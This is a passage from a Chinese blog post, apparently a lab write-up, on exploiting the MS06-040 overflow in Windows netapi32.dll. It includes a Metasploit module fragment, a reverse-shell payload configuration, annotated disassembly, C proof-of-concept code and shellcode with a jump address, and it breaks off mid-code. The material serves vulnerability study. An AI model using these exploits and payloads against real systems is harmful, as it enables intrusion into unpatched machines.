class="string">&quot;\x00\x00&quot;</span></span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">             NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.long(<span class="number">0</span>)    </span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect    </span><br><span class="line">    end  <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h3><p>攻击机：kali</p><p>IP地址：192.168.188.141</p><p>靶机：Windows2000 sp4</p><p>IP地址：192.168.188.133</p><h3 id="准备"><a class="markdownIt-Anchor" href="#准备"></a> 准备</h3><p>首先确定靶机开启的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(host㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap --allports -O 192.168.188.133                                                                               </span><br><span class="line">[sudo] host 的密码：</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 21:22 CST</span><br><span class="line">Nmap scan report for 192.168.188.133</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1723/tcp open  pptp</span><br><span class="line">MAC Address: 00:0C:29:97:7A:5F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 2000|XP</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_2000::- cpe:/o:microsoft:windows_2000::sp1 cpe:/o:microsoft:windows_2000::sp2 cpe:/o:microsoft:windows_2000::sp3 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::- cpe:/o:microsoft:windows_xp::sp1</span><br><span class="line">OS details: Microsoft Windows 2000 SP0 - SP4 or Windows XP SP0 - SP1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到打开了445端口。</p><p>最后的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(rgzz/ms06_040) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/rgzz/ms06_040):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS   192.168.188.133  yes       The target host(s), see https://gith</span><br><span class="line">                                       ub.com/rapid7/metasploit-framework/w</span><br><span class="line">                                       iki/Using-Metasploit</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh,</span><br><span class="line">                                        thread, process, none)</span><br><span class="line">   LHOST     192.168.188.141  yes       The listen address (an interface ma</span><br><span class="line">                                        y be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2000 SP0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用上面给出的代码，结果出错了，导致了靶机关机。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220716170814837.png" alt="image-20220716170814837"></p><h3 id="调试-serviceexe"><a class="markdownIt-Anchor" href="#调试-serviceexe"></a> 调试 service.exe</h3><p>将OD附加到services上，然后在<code>NetpwPathCanonicalize</code>（0x75107AFD）上下一个断点，F9继续执行。</p><p style="color:red;">回到攻击机上，执行exploit，再回到靶机，发现并没有在 NetpwPathCanonicalize 停下，而是直接提示关机，这样就无法进行后续调试了。不知道是不是漏洞已经被修补的缘故。上面的本地实验中，我用的也是本书资料中提供的netapi32.dll。</p><h1 id="windows-xp-环境下的-ms06040-exploit"><a class="markdownIt-Anchor" href="#windows-xp-环境下的-ms06040-exploit"></a> Windows XP 环境下的 MS06—040 exploit</h1><h2 id="静态分析-2"><a class="markdownIt-Anchor" href="#静态分析-2"></a> 静态分析</h2><p>选取 Windows XP SP3 的 netapi32.dll，对其 CanonicalizePathName 函数做静态分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall CanonicalizePathName(wchar_t*, wchar_t *, wchar_t *, int, int)</span><br><span class="line">71BA428B CanonicalizePathName proc near</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B Buff_last_word = word ptr -416h</span><br><span class="line">71BA428B Buff_OF = word ptr -414h</span><br><span class="line">71BA428B arg_Prefix = dword ptr 8</span><br><span class="line">71BA428B arg_Path = dword ptr 0Ch</span><br><span class="line">71BA428B arg_CanPath = dword ptr 10h</span><br><span class="line">71BA428B arg_Maxbuf = dword ptr 14h</span><br><span class="line">71BA428B arg_CanSize = dword ptr 18h</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B push ebp</span><br><span class="line">71BA428C mov ebp, esp</span><br><span class="line">71BA428E sub esp, 414h ; 依然分配了 0x414 字节栈空间，即 Buff_OF，</span><br><span class="line">; 用来存储合并路径(prefix+’\’+path)</span><br><span class="line">71BA4294 push ebx</span><br><span class="line">71BA4295 mov ebx, ds:__imp_wcscat</span><br><span class="line">71BA429B push esi</span><br><span class="line">71BA429C xor esi, esi</span><br><span class="line">71BA429E cmp [ebp+arg_Prefix], esi ; prefix 指针是否为 0</span><br><span class="line">71BA42A1 push edi</span><br><span class="line">71BA42A2 mov edi, ds:__imp_wcslen</span><br><span class="line">71BA42A8 jnz @@prefix_ptr_not_zero</span><br><span class="line">; 若 prefix 非 0，跳转至@@prefix_ptr_not_zero</span><br><span class="line">71BA42AE mov [ebp+Buff_OF], si ; 若 prefix 为 0，初始化 Buff_OF 为空串</span><br><span class="line">71BA42B5 @@chk_pathname:</span><br><span class="line">71BA42B5 push [ebp+arg_Path]</span><br><span class="line">71BA42B8 call edi ; __imp_wcslen ; 计算 path 串的 Unicode 长度</span><br><span class="line">71BA42BA add eax, esi; 计算合并路径长度</span><br><span class="line">71BA42BC cmp eax, 207h ; 对合并路径长度做越界检查，请注意，这里已经将</span><br><span class="line">                        ; 字节长度除 2，转化为 unicode 长度 0x207，而</span><br><span class="line">                        ; 在 Windows 2000 中，这个值是 0x411,没有做</span><br><span class="line">                        ; 转化，可见 Windows XP 的溢出另有原因！</span><br><span class="line">71BA42C1 pop ecx</span><br><span class="line">71BA42C2 ja @@err_invalid_name</span><br><span class="line">71BA42C8 push [ebp+arg_Path]</span><br><span class="line">71BA42CB lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA42D1 push eax</span><br><span class="line">71BA42D2 call ebx ; __imp_wcscat ; 将 Buff_OF(prefix+’\’)与 path 串合并</span><br><span class="line">; 得到合并路径</span><br><span class="line">…</span><br><span class="line">71BA4317 lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA431D push eax</span><br><span class="line">71BA431E call edi ; __imp_wcslen ; 计算合并路径 Unicode 长度</span><br><span class="line">71BA4320 lea eax, [eax+eax+2] ; 将 Unicode 长度转化为字节长度并加上结尾</span><br><span class="line">; 的两个空字节</span><br><span class="line">71BA4324 cmp eax, [ebp+arg_Maxbuf] ; 检查 can_path 的容量 maxbuf，是否可以</span><br><span class="line">; 可以容纳合并路径</span><br><span class="line">71BA4327 pop ecx</span><br><span class="line">71BA4328 ja @@err_buf_too_small ; 若 can_path 空间不够，退出</span><br><span class="line">71BA432E lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA4334 push eax</span><br><span class="line">71BA4335 push [ebp+arg_CanPath]</span><br><span class="line">71BA4338 call ds:__imp_wcscpy; 将合并路径复制 Buff_OF 至 can_path</span><br><span class="line">71BA433E pop ecx</span><br><span class="line">71BA433F pop ecx</span><br><span class="line">71BA4340 xor eax, eax ; 路径合并成功，返回 0</span><br><span class="line">71BA4342 @@quit:</span><br><span class="line">71BA4342 pop edi</span><br><span class="line">71BA4343 pop esi</span><br><span class="line">71BA4344 pop ebx</span><br><span class="line">71BA4345 leave</span><br><span class="line">71BA4346 retn 14h</span><br><span class="line">71BA4349 @@err_invalid_name:</span><br><span class="line">71BA4349 push ERROR_INVALID_NAME</span><br><span class="line">71BA434B pop eax</span><br><span class="line">71BA434C jmp short @@quit</span><br><span class="line">71BA434C CanonicalizePathName endp</span><br><span class="line">…</span><br><span class="line">71BB0E2D @@prefix_ptr_not_zero:</span><br><span class="line">71BB0E2D push [ebp+arg_Prefix]</span><br><span class="line">71BB0E30 call edi ; __imp_wcslen</span><br><span class="line">71BB0E32 mov esi, eax ; esi 存储 prefix 串的 unicode 长度</span><br><span class="line">71BB0E34 test esi, esi ; 检查 prefix 串长度是否为 0，即空串</span><br><span class="line">71BB0E36 pop ecx</span><br><span class="line">71BB0E37 jz @@chk_pathname ; 如果 prefix 为空串，则跳至</span><br><span class="line">                                    ; @@chk_pathname，请注意，如果代码</span><br><span class="line">                                    ; 流程走到这里， Buff_OF 始终是没有初</span><br><span class="line">                                    ; 始化的！这是 MS06-040 的另一个溢出点</span><br><span class="line">71BB0E3D cmp esi, 208h ; 如果 prefix 串非空，其 Unicode 长度</span><br><span class="line">; 不能超过 0x208，否则退出</span><br><span class="line">71BB0E43 ja @@err_invalid_name</span><br><span class="line">…</span><br><span class="line">71BB0EA9 @@err_buf_too_small:</span><br><span class="line">71BB0EA9 mov ecx, [ebp+arg_CanSize]</span><br><span class="line">71BB0EAC test ecx, ecx</span><br><span class="line">71BB0EAE jz short @@err_buf_too_small2</span><br><span class="line">71BB0EB0 mov [ecx], eax</span><br><span class="line">71BB0EB2 @@err_buf_too_small2:</span><br><span class="line">71BB0EB2 mov eax, NERR_BufTooSmall</span><br><span class="line">71BB0EB7 jmp @@quit</span><br><span class="line">…</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br></pre></td></tr></table></figure><p>从上面的第 31 行中可以看到，上一个实验中 cmp eax,411 已经被修补，无法在利用。不过，通过进一步静态分析，可以发现 CanonicalizePathName 函数在分配了栈空间 Buff_OF 后，没有进行初始化；如果 prefix 指针为 0，代码会对 Buff_OF 做初始化（见 0x71BA42AE）；而如果 prefix 非 0，并指向空字串，代码将直接对未初始化的 Buff_OF 和 path 串用 wcscat 函数进行连接（见 0x71BA42B5-0x71BA42D2）。这是一个非常危险的操作，因为未初始化的栈空间 Buff_OF 的长度是未知的，甚至可能超过 0x414 字节，其后再连接上 path 串，很有可能产生溢出。</p><p>由于 Buff_OF 位于栈中，内容随机，怎样控制它的长度，是如何利用这个漏洞的重点。我们可以通过连续调用 CanonicalizePathName 函数来控制它的长度。 因为当 Buff_OF 被首次填充并连接，直到 CanonicalizePathName 函数退出后，其所在的栈空间位于 ESP 的低地址，如果不做任何栈操作，如函数调用等，内容是不会改变的；此时，如果再次调用 CanonicalizePathName，已经被填充的 Buff_OF 将面临溢出的风险。</p><p>CanonicalizePathName 是 NetpwPathCanonicalize 的子函数，不能直接被调用。分析一下函数 NetpwPathCanonicalize 是如何调用 CanonicalizePathName 的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">71BA421A mov esi, [ebp+arg_CanPath]</span><br><span class="line">71BA421D push edi</span><br><span class="line">71BA421E push [ebp+arg_Maxbuf]</span><br><span class="line">71BA4221 mov [esi], di</span><br><span class="line">71BA4224 push esi</span><br><span class="line">71BA4225 push [ebp+arg_Path]</span><br><span class="line">71BA4228 push ebx</span><br><span class="line">71BA4229 call CanonicalizePathName</span><br><span class="line">71BA422E cmp eax, edi ; 检查函数 CanonicalizePathName 的返回值</span><br><span class="line">71BA4230 jnz short @@quit ; 非 0 则直接退出</span><br><span class="line">71BA4232 push edi</span><br><span class="line">71BA4233 push [ebp+arg_Pathtype]</span><br><span class="line">71BA4236 push esi</span><br><span class="line">71BA4237 call NetpwPathType</span><br><span class="line">71BA423C jmp short @@quit</span><br><span class="line">...</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall NetpwPathCanonicalize(wchar_t *, wchar_t *, int, int, int, int)</span><br><span class="line">71BA4244 public NetpwPathCanonicalize</span><br><span class="line">71BA4244 NetpwPathCanonicalize proc near</span><br><span class="line">71BA4244</span><br><span class="line">71BA4244 arg_Path = dword ptr 8</span><br><span class="line">71BA4244 arg_CanPath = dword ptr 0Ch</span><br><span class="line">71BA4244 arg_Maxbuf = dword ptr 10h</span><br><span class="line">71BA4244 arg_Prefix = dword ptr 14h</span><br><span class="line">71BA4244 arg_Pathtype = dword ptr 18h</span><br><span class="line">71BA4244 arg_Pathflags = dword ptr 1Ch</span><br><span class="line">...</span><br><span class="line">71BA4284 @@quit</span><br><span class="line">71BA4284 pop edi</span><br><span class="line">71BA4285 pop esi</span><br><span class="line">71BA4286 pop ebx</span><br><span class="line">71BA4287 pop ebp</span><br><span class="line">71BA4288 retn 18h</span><br><span class="line">71BA4288 NetpwPathCanonicalize endp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果能够使 CanonicalizePathName 调用失败（返回值非 0），NetpwPathCanonicalize 将直接退出，从而保证 Buff_OF 所在的栈空间不发生变化。由于参数 maxbuf 是可控的，我们可 以 利 用 较 小 的 maxbuf ， 使 CanonicalizePathName 返 回 NERR_BufTooSmall （参看 0x71BA4317-0x71BA4328）而直接退出。</p><p>MS06-040 在 Windows XP 下溢出的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE (0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试-2"><a class="markdownIt-Anchor" href="#动态调试-2"></a> 动态调试</h2><p>在动态调试时，当第二次调用 NetpwPathCanonicalize，运行至 0x5FDDA33E 处的 wcscat 时发生了栈溢出，如下图所示。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717215304487.png" alt="image-20220717215304487"></p><p>可以看到， EBP、返回地址以及 CanonicalizePathName 的部分参数被覆盖，溢出成功。ecx 始终指向栈中（0x0012EA18），那我们就选用 0x71BBFCBE 处的 CALL ECX 作为跳板。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717220145700.png" alt="image-20220717220145700"></p><p>从上面溢出图片可以看出，0x0012EE2C 是被 ”bbbb“ 溢出覆盖了，我们只用找到它相对偏移就能够替换掉 0x0012EE2C 处的内容。向前找到 b 的起始位置，可以看到 b 从 0x0012EB9A 处开始，相对偏移就是 0x(292+4)。直接在钩造完成后，复制前，把PathName2[296] 覆盖为我们想要的地址( 0x71BBFCBE )。</p><p>因为我们需要执行 shellcode，所以我们要把 shellcode 放在 PathName1 的开头，就能运行。</p><p>按照如下布局，构建代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE (0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ShellCode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span 